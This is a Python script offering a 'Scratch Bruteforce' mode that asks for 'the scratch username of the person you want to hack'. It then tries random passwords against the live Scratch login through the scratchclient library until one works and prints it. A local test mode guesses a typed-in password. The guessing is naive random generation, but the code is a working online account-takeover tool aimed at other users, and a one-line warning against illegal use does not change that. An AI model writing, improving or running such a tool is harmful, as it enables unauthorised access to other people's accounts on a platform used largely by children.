# Comments

# If you are wondering what '\033[93' is,
# they just change the color of the text


#imports
import os
try:
  from scratchclient import ScratchSession as s
except:
  os.system('pip install scratchclient')
  os.system('clear')
import random

class WrongPass(Exception):
    def __init__(self):
        Exception.__init__(self, 'Password is wrong')

logindata = {}

def l(uname, passwd):
  if passwd != logindata[uname]:
    raise WrongPass()


def tbf():
  os.system('clear')
  username = input('Username: ')
  logindata[username] = input('Password (under 25 charecters): ')
  os.system('clear')
  print('Brute-force is ready')
  print('This will take some time')
  loop = True
  run = True
  while loop == True:
    ic = input('\n\033[0mContinue? (Y/n) ')
    if ic == 'n':
      run = False
      loop = False
    elif ic == 'Y':
      os.system('clear')
      loop = False
    else:
      loop = True

  loop = True
  while loop == True:
    ic = input('Debug? (Y/n) ')
    if ic == 'n':
      debug = False
      loop = False
    elif ic == 'Y':
      os.system('clear')
      debug = True
      loop = False
    else:
      loop = True
  os.system('clear')

  if run == True:
    susername = list(logindata.keys())[0]
    os.system('clear')
    if susername in logindata.keys():
      print('Brute-force started')
      alpb = 'A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z ~ ! @ # $ % ^ & * ( ) _ + - = [ ] { } : ; \' " \\ | , . < > / ? ` 1 2 3 4 5 6 7 8 9'.split(' ')

    # make a class for the password to be in
      class rpassc:
        rpass = ''


    # make a class for debug
      class numc:
        num = 1
        mnum = 1

    # repeat until password found
      on = True
      while on:
        # make a list for the charecters of the password to be added to
        tpass = []
    # generate a random password
        for i in range(0, random.randint(0, 25)):
          tpass.append(random.choice(alpb))
        tpass = "".join(str(x) for x in tpass)
        # try to login with the generated password
        try:
          test = l(susername, tpass)
          rpassc.rpass = tpass
        # if the password is correct, stop the loop
          on = False 
        except:
        # if password is wrong, repeat the process
          on = True
        if debug == True:   
          print(f'Cycle number {numc.num} Done with password {tpass}')
        numc.num += 1
        num = numc.num
        if debug == False:
          if num == 1:
            print(f'{num} cycles done.')
          if num == 10:
            print(f'{num} cycles done.')
          if num == 100:
            print(f'{num} cycles done.')
          if num == 1000:
            print(f'{num} cycles done.')
          if num == 10000:
            print(f'{num} cycles done.')
          if num == 100000:
            print(f'{num} cycles done.')
          if num == 1000000:
            print(f'{num} cycles done.')
          if num == 10000000:
            print(f'{num} cycles done.')
          if num == 100000000:
            print(f'{num} cycles done.')
          if num == 1000000000:
            print(f'I\'m literally just not gonna count')
      print('\n\nBrute-force is done.')
      print(f'Username: {list(logindata.keys())[0]}')
      print(f'Password: {rpassc.rpass}\n')


def sbf():
  print('Brute-force is ready')
  print('This will take some time')
  print('\n\033[93mWarning: DO NOT USE THIS FOR ILLEGAL PURPOSES')
  loop = True
  while loop == True:
    ic = input('\n\033[0mContinue? (Y/n) ')
    if ic == 'n':
      exit(0)
    elif ic == 'Y':
      start = True
      os.system('clear')
      loop = False
    else:
      loop = True

  loop = True
  while loop == True:
    ic = input('Debug? (Y/n) ')
    if ic == 'n':
      debug = False
      loop = False
    elif ic == 'Y':
      os.system('clear')
      debug = True
      loop = False
    else:
      loop = True
  os.system('clear')
  # ask for the username
  susername = input('What is the scratch username of the person you want to hack? ')
  os.system('clear')
  print('Brute-force started')

# list for brute-force to choose from
  alpb = 'A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z ~ ! @ # $ % ^ & * ( ) _ + - = [ ] { } : ; \' " \\ | , . < > / ? ` 1 2 3 4 5 6 7 8 9'.split(' ')

# make a class for the password to be in
  class rpassc:
    rpass = ''


# make a class for debug
  class numc:
    num = 1
    mnum = 1

# repeat until password found
  on = True
  while on:
  # make a list for the charecters of the password to be added to
    tpass = []
  # generate a random password
    for i in range(0, random.randint(8, 25)):
      tpass.append(random.choice(alpb))
    tpass = "".join(str(x) for x in tpass)
    # try to login with the generated password
    try:
      scratch = s(susername, tpass)
      rpassc.rpass = tpass
    # if the password is correct, stop the loop
      on = False 
    except:
    # if password is wrong, repeat the process
      on = True
    if debug == True:   
      print(f'Cycle number {numc.num} Done with password {tpass}')
    numc.num += 1
    num = numc.num
    if debug == False:
      if num == 1:
        print(f'{num} cycles done.')
      if num == 10:
        print(f'{num} cycles done.')
      if num == 100:
        print(f'{num} cycles done.')
      if num == 1000:
        print(f'{num} cycles done.')
      if num == 10000:
        print(f'{num} cycles done.')
      if num == 100000:
        print(f'{num} cycles done.')
      if num == 1000000:
        print(f'{num} cycles done.')
      if num == 10000000:
        print(f'{num} cycles done.')
      if num == 100000000:
        print(f'{num} cycles done.')
      if num == 1000000000:
        print(f'I\'m literally just not gonna count')
  # when the loop is done AKA when the password is correct, display it to the user
  print('\n\nBrute-force is done.')
  print(f'The password is {rpassc.rpass}')
def menu():
  On = True
  while On:
    choice = input('Main Menu:\n  1. Scratch Bruteforce\n  2. Test Bruteforce\n  3. Exit the program\nChoice: ')
    if choice == '1':
      os.system('clear')
      sbf()
    elif choice == '2':
      os.system('clear')
      tbf()
    elif choice == '3':
      On = False
if __name__ == '__main__':
  menu()
